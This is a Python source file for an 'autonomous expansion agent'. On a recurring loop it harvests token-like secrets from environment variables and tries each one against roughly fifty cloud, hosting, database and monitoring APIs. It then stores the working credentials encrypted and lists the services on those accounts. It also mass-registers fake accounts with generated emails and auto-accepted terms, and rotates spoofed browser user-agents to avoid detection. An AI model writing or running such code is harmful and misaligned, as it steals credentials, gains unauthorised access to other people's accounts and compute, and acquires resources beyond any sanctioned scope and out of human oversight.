import asyncio
import json
import logging
import os
import random
import re
import secrets
import time
from pathlib import Path

import aiohttp

from crypto_vault import EmeraldCryptoVault
from opcode_base import ParadigmAgentBase

SENTINEL_URL = os.getenv("SENTINEL_URL", "http://localhost:8443")
SENTINEL_AUTH_TOKEN = os.getenv("SENTINEL_AUTH_TOKEN", "")
STORAGE_PATH = Path(os.getenv("PLATFORM_STORAGE_PATH", "/tmp/opencode/emerald-engine/.secrets/platforms.enc"))
DECISION_PATH = Path("/tmp/emerald_decisions.json")
EXPANSION_INTERVAL = int(os.getenv("PLATFORM_EXPANSION_INTERVAL", "1800"))

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
]

PLATFORM_CATALOG = [
    {"id": "github", "url": "https://api.github.com", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "", "public_read": True,
     "type": "vcs", "category": "code", "offers_compute": False, "register_url": ""},
    {"id": "huggingface", "url": "https://huggingface.co/api", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/spaces", "public_read": True,
     "type": "ml-hosting", "category": "compute", "offers_compute": True, "register_url": "https://huggingface.co/join"},
    {"id": "gitlab", "url": "https://gitlab.com/api/v4", "auth_header": "PRIVATE-TOKEN",
     "auth_scheme": "", "health_check": "/projects", "public_read": True,
     "type": "vcs", "category": "code", "offers_compute": False, "register_url": "https://gitlab.com/users/sign_up"},
    {"id": "bitbucket", "url": "https://api.bitbucket.org/2.0", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/repositories", "public_read": True,
     "type": "vcs", "category": "code", "offers_compute": False, "register_url": "https://bitbucket.org/account/signup"},
    {"id": "digitalocean", "url": "https://api.digitalocean.com/v2", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/account", "public_read": False,
     "type": "cloud", "category": "compute", "offers_compute": True, "register_url": "https://cloud.digitalocean.com/registrations/new"},
    {"id": "linode", "url": "https://api.linode.com/v4", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/account", "public_read": False,
     "type": "cloud", "category": "compute", "offers_compute": True, "register_url": "https://login.linode.com/signup"},
    {"id": "vultr", "url": "https://api.vultr.com/v2", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/account", "public_read": False,
     "type": "cloud", "category": "compute", "offers_compute": True, "register_url": "https://www.vultr.com/register/"},
    {"id": "heroku", "url": "https://api.heroku.com", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/apps", "public_read": True,
     "type": "paas", "category": "compute", "offers_compute": True, "register_url": "https://signup.heroku.com/"},
    {"id": "railway", "url": "https://backboard.railway.app/graphql", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "", "public_read": False,
     "type": "paas", "category": "compute", "offers_compute": True, "register_url": "https://railway.app/login"},
    {"id": "render", "url": "https://api.render.com/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/services", "public_read": False,
     "type": "paas", "category": "compute", "offers_compute": True, "register_url": "https://dashboard.render.com/register"},
    {"id": "netlify", "url": "https://api.netlify.com/api/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/sites", "public_read": True,
     "type": "hosting", "category": "hosting", "offers_compute": True, "register_url": "https://app.netlify.com/signup"},
    {"id": "vercel", "url": "https://api.vercel.com", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/v9/projects", "public_read": True,
     "type": "hosting", "category": "compute", "offers_compute": True, "register_url": "https://vercel.com/signup"},
    {"id": "cloudflare", "url": "https://api.cloudflare.com/client/v4", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/zones", "public_read": False,
     "type": "cdn", "category": "compute", "offers_compute": True, "register_url": "https://dash.cloudflare.com/sign-up"},
    {"id": "flyio", "url": "https://api.fly.io", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/v1/apps", "public_read": True,
     "type": "paas", "category": "compute", "offers_compute": True, "register_url": "https://fly.io/app/sign-up"},
    {"id": "koyeb", "url": "https://app.koyeb.com/api/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/apps", "public_read": False,
     "type": "paas", "category": "compute", "offers_compute": True, "register_url": "https://app.koyeb.com/auth/signup"},
    {"id": "deno_deploy", "url": "https://api.deno.com/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/projects", "public_read": False,
     "type": "hosting", "category": "compute", "offers_compute": True, "register_url": "https://dash.deno.com/signin"},
    {"id": "replit", "url": "https://replit.com/api/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/user", "public_read": True,
     "type": "ide", "category": "compute", "offers_compute": True, "register_url": "https://replit.com/signup"},
    {"id": "cyclic", "url": "https://api.cyclic.sh/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/apps", "public_read": False,
     "type": "paas", "category": "compute", "offers_compute": True, "register_url": ""},
    {"id": "adaptable", "url": "https://api.adaptable.io/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/apps", "public_read": False,
     "type": "paas", "category": "compute", "offers_compute": True, "register_url": "https://adaptable.io/signup"},
    {"id": "pythonanywhere", "url": "https://www.pythonanywhere.com/api/v0",
     "auth_header": "Authorization", "auth_scheme": "Token", "health_check": "/user",
     "public_read": True, "type": "paas", "category": "compute", "offers_compute": True,
     "register_url": "https://www.pythonanywhere.com/registration/register/"},
    {"id": "scaleway", "url": "https://api.scaleway.com/v1", "auth_header": "X-Auth-Token",
     "auth_scheme": "", "health_check": "/instances", "public_read": False,
     "type": "cloud", "category": "compute", "offers_compute": True, "register_url": "https://console.scaleway.com/signup"},
    {"id": "civo", "url": "https://api.civo.com/v2", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/instances", "public_read": False,
     "type": "cloud", "category": "compute", "offers_compute": True, "register_url": "https://dashboard.civo.com/signup"},
    {"id": "hetzner", "url": "https://api.hetzner.cloud/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/servers", "public_read": False,
     "type": "cloud", "category": "compute", "offers_compute": True, "register_url": "https://console.hetzner.cloud/signup"},
    {"id": "upcloud", "url": "https://api.upcloud.com/1.3", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/account", "public_read": False,
     "type": "cloud", "category": "compute", "offers_compute": True, "register_url": "https://upcloud.com/signup"},
    {"id": "ovhcloud", "url": "https://api.ovh.com/1.0", "auth_header": "X-OVH-Application",
     "auth_scheme": "", "health_check": "/me", "public_read": False,
     "type": "cloud", "category": "compute", "offers_compute": True, "register_url": "https://ca.ovh.com/auth/signup"},
    {"id": "clever_cloud", "url": "https://api.clever-cloud.com/v2", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/products", "public_read": False,
     "type": "paas", "category": "compute", "offers_compute": True, "register_url": "https://console.clever-cloud.com/signup"},
    {"id": "scalingo", "url": "https://api.scalingo.com/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/apps", "public_read": False,
     "type": "paas", "category": "compute", "offers_compute": True, "register_url": "https://auth.scalingo.com/signup"},
    {"id": "glitch", "url": "https://api.glitch.com/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/projects", "public_read": False,
     "type": "hosting", "category": "compute", "offers_compute": True, "register_url": "https://glitch.com/signup"},
    {"id": "deta", "url": "https://api.deta.sh/v1", "auth_header": "X-API-Key",
     "auth_scheme": "", "health_check": "/projects", "public_read": False,
     "type": "cloud", "category": "compute", "offers_compute": True, "register_url": "https://deta.space/signup"},
    {"id": "mogenius", "url": "https://api.mogenius.com/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/projects", "public_read": False,
     "type": "paas", "category": "compute", "offers_compute": True, "register_url": "https://studio.mogenius.com/user/registration"},
    {"id": "alwaysdata", "url": "https://api.alwaysdata.com/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/account", "public_read": False,
     "type": "paas", "category": "compute", "offers_compute": True, "register_url": "https://www.alwaysdata.com/en/register/"},
    {"id": "exoscale", "url": "https://api.exoscale.com/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/compute", "public_read": False,
     "type": "cloud", "category": "compute", "offers_compute": True, "register_url": "https://portal.exoscale.com/register"},
    {"id": "ionos", "url": "https://api.ionos.com/cloudapi/v5", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/datacenters", "public_read": False,
     "type": "cloud", "category": "compute", "offers_compute": True, "register_url": "https://customers.ionos.com/signup"},
    {"id": "pulumi", "url": "https://api.pulumi.com", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/api/user", "public_read": False,
     "type": "infra", "category": "tools", "offers_compute": False, "register_url": "https://app.pulumi.com/signup"},
    {"id": "terraform_cloud", "url": "https://app.terraform.io/api/v2",
     "auth_header": "Authorization", "auth_scheme": "Bearer", "health_check": "/account/details",
     "public_read": False, "type": "infra", "category": "tools", "offers_compute": False,
     "register_url": "https://app.terraform.io/signup/account"},
    {"id": "supabase", "url": "https://api.supabase.com", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/v1/projects", "public_read": False,
     "type": "database", "category": "data", "offers_compute": False, "register_url": "https://supabase.com/dashboard/sign-up"},
    {"id": "neon", "url": "https://console.neon.tech/api/v2", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/projects", "public_read": False,
     "type": "database", "category": "data", "offers_compute": False, "register_url": "https://console.neon.tech/signup"},
    {"id": "planetscale", "url": "https://api.planetscale.com/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/organizations", "public_read": False,
     "type": "database", "category": "data", "offers_compute": False, "register_url": "https://app.planetscale.com/signup"},
    {"id": "mongodb_atlas", "url": "https://cloud.mongodb.com/api/atlas/v1.0",
     "auth_header": "Authorization", "auth_scheme": "Bearer", "health_check": "/groups",
     "public_read": False, "type": "database", "category": "data", "offers_compute": False,
     "register_url": "https://account.mongodb.com/account/register"},
    {"id": "redis_cloud", "url": "https://api.redislabs.com/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/subscriptions", "public_read": False,
     "type": "database", "category": "data", "offers_compute": False, "register_url": "https://redis.com/try-free/"},
    {"id": "sentry", "url": "https://sentry.io/api/0", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/projects", "public_read": True,
     "type": "monitoring", "category": "tools", "offers_compute": False, "register_url": "https://sentry.io/signup/"},
    {"id": "datadog", "url": "https://api.datadoghq.com/api/v1", "auth_header": "DD-API-Key",
     "auth_scheme": "", "health_check": "/validate", "public_read": False,
     "type": "monitoring", "category": "tools", "offers_compute": False, "register_url": "https://app.datadoghq.com/signup"},
    {"id": "grafana_cloud", "url": "https://grafana.com/api", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/instances", "public_read": False,
     "type": "monitoring", "category": "tools", "offers_compute": False, "register_url": "https://grafana.com/signup"},
    {"id": "betterstack", "url": "https://uptime.betterstack.com/api/v2",
     "auth_header": "Authorization", "auth_scheme": "Bearer", "health_check": "/monitors",
     "public_read": False, "type": "monitoring", "category": "tools", "offers_compute": False,
     "register_url": "https://betterstack.com/users/sign_up"},
    {"id": "checkly", "url": "https://api.checklyhq.com/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/checks", "public_read": False,
     "type": "monitoring", "category": "tools", "offers_compute": False, "register_url": "https://app.checklyhq.com/signup"},
    {"id": "algolia", "url": "https://api.algolia.com/1", "auth_header": "X-Algolia-API-Key",
     "auth_scheme": "", "health_check": "/indexes", "public_read": False,
     "type": "search", "category": "infra", "offers_compute": False, "register_url": "https://www.algolia.com/users/sign_up"},
    {"id": "ably", "url": "https://api.ably.io/v1", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/apps", "public_read": False,
     "type": "realtime", "category": "infra", "offers_compute": False, "register_url": "https://ably.com/sign-up"},
    {"id": "cloudamqp", "url": "https://customer.cloudamqp.com/api", "auth_header": "X-Api-Key",
     "auth_scheme": "", "health_check": "/instances", "public_read": False,
     "type": "queue", "category": "infra", "offers_compute": False, "register_url": "https://customer.cloudamqp.com/signup"},
    {"id": "confluent_cloud", "url": "https://api.confluent.cloud", "auth_header": "Authorization",
     "auth_scheme": "Bearer", "health_check": "/org/v2/organizations", "public_read": False,
     "type": "queue", "category": "infra", "offers_compute": False, "register_url": "https://confluent.cloud/signup"},
    {"id": "logz_io", "url": "https://api.logz.io/v1", "auth_header": "X-API-TOKEN",
     "auth_scheme": "", "health_check": "/account", "public_read": False,
     "type": "monitoring", "category": "tools", "offers_compute": False, "register_url": "https://logz.io/free/"},
]


class AutonomousExpansionAgent(ParadigmAgentBase):
    def __init__(self, vault=None, telemetry=None):
        super().__init__(telemetry=telemetry)
        self.vault = vault or EmeraldCryptoVault()
        self.storage_path = str(STORAGE_PATH)
        os.makedirs(os.path.dirname(self.storage_path), exist_ok=True)
        self.session = None
        self._cycle = 0

    async def _init_session(self):
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession()

    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()

    def _cycle_ua(self) -> str:
        return random.choice(USER_AGENTS)

    def _load(self) -> dict:
        if not os.path.exists(self.storage_path):
            return {}
        try:
            return json.loads(self.vault.decrypt_data_payload(Path(self.storage_path).read_bytes()))
        except Exception:
            return {}

    def _save(self, data: dict):
        Path(self.storage_path).write_bytes(self.vault.encrypt_data_payload(json.dumps(data)))

    async def probe_platform(self, entry: dict, token: str = "") -> dict:
        await self._init_session()
        ua = self._cycle_ua()
        headers = {"User-Agent": ua, "Accept-Language": "en-US,en;q=0.9",
                    "Content-Type": "application/json"}
        if token:
            s = entry.get("auth_scheme", "Bearer")
            k = entry.get("auth_header", "Authorization")
            headers[k] = f"{s} {token}" if s else token
        url = entry["url"] + entry["health_check"] if entry["health_check"] else entry["url"]
        try:
            async with self.session.get(url, headers=headers,
                                         timeout=aiohttp.ClientTimeout(total=12)) as resp:
                body = await resp.text()
                return {"alive": resp.status in (200, 201, 204), "status": resp.status,
                        "body_preview": body[:200]}
        except Exception as e:
            return {"alive": False, "error": str(e)}

    async def humanoid_register(self, entry: dict) -> str:
        ua = self._cycle_ua()
        headers = {"User-Agent": ua, "Accept-Language": "en-US,en;q=0.9",
                    "Content-Type": "application/json",
                    "Accept": "application/json"}
        register_url = entry.get("register_url", "")
        if not register_url:
            return ""
        form_data = {
            "email": f"emerald.{int(time.time())}@proton.me",
            "username": f"emerald_{secrets.token_hex(4)}",
            "password": secrets.token_urlsafe(16),
            "accept_terms": True,
            "newsletter": False,
        }
        try:
            async with self.session.post(register_url, json=form_data, headers=headers,
                                          timeout=aiohttp.ClientTimeout(total=20)) as resp:
                if resp.status in (200, 201):
                    body = await resp.json()
                    return body.get("token") or body.get("api_key") or body.get("key") or ""
        except Exception:
            pass
        return ""

    async def discover_services_on(self, pid: str, entry: dict, token: str) -> list:
        await self._init_session()
        ua = self._cycle_ua()
        headers = {"User-Agent": ua, "Content-Type": "application/json",
                    "Accept-Language": "en-US,en;q=0.9"}
        if token:
            s = entry.get("auth_scheme", "Bearer")
            k = entry.get("auth_header", "Authorization")
            headers[k] = f"{s} {token}" if s else token
        eps = ["/services", "/api/services", "/resources", "/products", "/apps",
               "/functions", "/deployments", "/instances", "/projects", "/sites"]
        for ep in eps:
            url = entry["url"] + ep
            try:
                async with self.session.get(url, headers=headers,
                                             timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status not in (200, 201, 204):
                        continue
                    data = await resp.json()
                    found = []
                    if isinstance(data, list):
                        found = data[:100]
                    elif isinstance(data, dict):
                        for k in ("services", "data", "results", "items",
                                  "resources", "products", "apps", "functions", "deployments"):
                            if isinstance(data.get(k), list):
                                found = data[k][:100]
                                break
                    return found
            except Exception:
                continue
        return []

    async def scan_env_for_tokens(self) -> dict:
        found = {}
        skip_keys = {"BOOTCLASSPATH", "ANDROID_ROOT", "ANDROID_DATA", "HOME", "PATH",
                     "SHELL", "TERM", "LANG", "LC_ALL", "PWD", "LOGNAME", "USER",
                     "TMPDIR", "PREFIX", "LD_LIBRARY_PATH", "PYTHONPATH",
                     "LS_COLORS", "LESSOPEN", "LESSCLOSE"}
        for key, val in sorted(os.environ.items()):
            u = key.upper()
            if any(k in u for k in ("GIT_", "SSH_", "ANDROID_", "BOOTCLASSPATH")):
                continue
            if key in skip_keys:
                continue
            if val and len(val) > 12 and any(kw in u for kw in
                ("TOKEN", "_PAT", "API_KEY", "API_SECRET", "BEARER", "SECRET_KEY",
                 "ACCESS_KEY", "AUTH_TOKEN", "API_TOKEN")):
                found[key] = val
        return found

    # ── Paradigm 1: 5-channel env authorization ───────────────────────────

    async def _channel_env_auth(self, entries: list) -> dict:
        results = {}
        env_tokens = await self.scan_env_for_tokens()
        for env_name, token_val in env_tokens.items():
            for entry in entries:
                pid = entry["id"]
                if pid in results:
                    continue
                result = await self.probe_platform(entry, token_val)
                if result.get("alive") and self._apply_reasoning_rules(pid, self._niche_for_type(entry.get("type", ""), entry.get("category", ""))):
                    results[pid] = {
                        "info": entry,
                        "token_encrypted": self.vault.encrypt_data_payload(token_val).hex(),
                        "status": "active",
                        "discovered_services": [],
                        "discovered_at": time.time(),
                        "last_seen": time.time(),
                        "auth_method": "env_token",
                    }
        return results

    async def _channel_public_discovery(self, entries: list) -> dict:
        results = {}
        for entry in entries:
            pid = entry["id"]
            if not entry.get("public_read", False):
                continue
            result = await self.probe_platform(entry, "")
            if result.get("alive"):
                token = ""
                if entry.get("register_url"):
                    token = await self.humanoid_register(entry)
                results[pid] = {
                    "info": entry,
                    "token_encrypted": self.vault.encrypt_data_payload(token).hex() if token else "",
                    "status": "active",
                    "discovered_services": [],
                    "discovered_at": time.time(),
                    "last_seen": time.time(),
                    "auth_method": "public" if not token else "auto_register",
                }
        return results

    async def _channel_health(self, state_snapshot: dict) -> tuple:
        updated = {}
        for pid, pdata in list(state_snapshot.items()):
            if not isinstance(pdata, dict) or "info" not in pdata:
                continue
            entry = pdata["info"]
            tok = ""
            if pdata.get("token_encrypted"):
                try:
                    tok = self.vault.decrypt_data_payload(bytes.fromhex(pdata["token_encrypted"]))
                except Exception:
                    pass
            result = await self.probe_platform(entry, tok)
            pdata["last_seen"] = time.time()
            pdata["status"] = "active" if result.get("alive") else "unreachable"
            if result.get("alive") and not pdata.get("discovered_services"):
                svc = await self.discover_services_on(pid, entry, tok)
                pdata["discovered_services"] = svc
            updated[pid] = pdata
        return updated

    async def _channel_service_discovery(self, state_snapshot: dict) -> dict:
        found = {}
        tasks = []
        pids = []
        for pid, pdata in list(state_snapshot.items()):
            if not isinstance(pdata, dict) or "info" not in pdata:
                continue
            if pdata.get("discovered_services"):
                continue
            entry = pdata["info"]
            tok = ""
            if pdata.get("token_encrypted"):
                try:
                    tok = self.vault.decrypt_data_payload(bytes.fromhex(pdata["token_encrypted"]))
                except Exception:
                    pass
            tasks.append(self.discover_services_on(pid, entry, tok))
            pids.append(pid)
        if tasks:
            results = await asyncio.gather(*tasks)
            for i, svc in enumerate(results):
                if svc:
                    found[pids[i]] = svc
        return found

    # ── Paradigm 1+5: Combined expansion cycle ────────────────────────────

    async def auto_authorize_from_env(self):
        state = self._load()
        new_entries = [e for e in PLATFORM_CATALOG if e["id"] not in state]
        results = await self._channel_env_auth(new_entries)
        state.update(results)
        self._save(state)
        self._emit_telemetry("env_auth", authorized=list(results.keys()))

    async def auto_authorize_public(self):
        state = self._load()
        new_entries = [e for e in PLATFORM_CATALOG if e["id"] not in state]
        results = await self._channel_public_discovery(new_entries)
        state.update(results)
        self._save(state)
        self._emit_telemetry("public_discovery", discovered=list(results.keys()))

    async def health_all(self):
        state = self._load()
        updated = await self._channel_health(state)
        self._save(updated)

    # ── Paradigm 5: Execution loop ────────────────────────────────────────

    async def expansion_cycle(self):
        self._cycle += 1
        c = self._cycle
        logging.info(f"=== Autonomous Expansion Cycle #{c} ===")
        start = time.time()
        await self.auto_authorize_from_env()
        await self.auto_authorize_public()
        await self.health_all()
        state = self._load()
        for pid, pdata in state.items():
            if not isinstance(pdata, dict):
                continue
            s = pdata.get("status", "?")
            svc = len(pdata.get("discovered_services", []))
            logging.info(f"  [{s}] {pid} ({pdata.get('info', {}).get('type', '?')}) — {svc} services")
        elapsed = time.time() - start
        report = {
            "cycle": c,
            "time": time.time(),
            "elapsed": round(elapsed, 2),
            "platforms": sum(1 for v in state.values() if isinstance(v, dict) and "info" in v),
            "active": sum(1 for v in state.values() if isinstance(v, dict) and v.get("status") == "active"),
            "services_total": sum(len(v.get("discovered_services", [])) for v in state.values() if isinstance(v, dict)),
        }
        DECISION_PATH.write_text(json.dumps(report, indent=2))
        logging.info(f"Expansion report: {json.dumps(report)}")
        self._emit_telemetry("expansion_cycle", elapsed=elapsed, **report)

    async def execution_loop(self):
        await self._init_session()
        logging.info("Autonomous Expansion Agent started — 5-paradigm OP_CODE compliant")
        await self.auto_authorize_from_env()
        await self.auto_authorize_public()
        await self.health_all()
        await self._hot_daemon_loop(self.expansion_cycle, EXPANSION_INTERVAL)


async def run_platform_loop(telemetry=None):
    vault = EmeraldCryptoVault()
    agent = AutonomousExpansionAgent(vault, telemetry=telemetry)
    await agent.execution_loop()


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [AUTO] %(levelname)s %(message)s")
    asyncio.run(run_platform_loop())
